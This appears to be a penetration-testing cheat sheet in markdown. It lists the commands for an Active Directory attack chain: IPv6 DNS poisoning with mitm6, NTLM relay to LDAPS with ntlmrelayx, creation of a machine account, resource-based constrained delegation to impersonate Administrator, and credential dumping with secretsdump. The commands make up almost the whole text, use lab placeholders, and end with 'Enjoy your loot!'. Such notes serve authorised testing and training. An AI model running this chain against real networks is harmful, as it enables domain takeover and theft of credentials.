### Essentially, we become Man-in-the-Middle using IPv6

## Tools: mitm6, ntlmrelayx

# DNS Poisoning - Relay delegation with mitm6

## Tool: https://github.com/dirkjanm/mitm6

## Requirements

#### 1) IPv6 enabled (Windows prefers IPV6 over IPv4)

#### 2) LDAP over TLS (LDAPS)

### ntlmrelayx relays the captured credentials to LDAP on the domain controller, uses that to create a new machine account, print the account's name and password and modifies the delegation rights of it.

## Steps

 - mitm6 -hw ws02 -d lab.local --ignore-nofqnd

 - ntlmrelayx.py -ip 10.10.10.10 -t ldaps://dc01.lab.local -wh attacker-wpad

 - ntlmrelayx.py -ip 10.10.10.10 -t ldaps://dc01.lab.local -wh attacker-wpad --add-computer

### Now granting delegation rights and then do a RBCD

 - ntlmrelayx.py -t ldaps://dc01.lab.local --delegate-access --no-smb-server -wh attacker-wpad

 - getST.py -spn cifs/target.lab.local lab.local/GENERATED\$ -impersonate Administrator

 - export KRB5CCNAME=administrator.ccache

 - secretsdump.py -k -no-pass target.lab.local


## Steps: 

#### 1) 

    sudo mitm6 -d DOMAIN

#### 2) 

    ntlmrelayx.py -6 -t ldaps://DC_IP -wh FAKE.DOMAIN -l FOLDER (Run this first!)

#### 3) Enjoy your loot! (Enumerates EVERYTHING that tries to authenticate against the target)

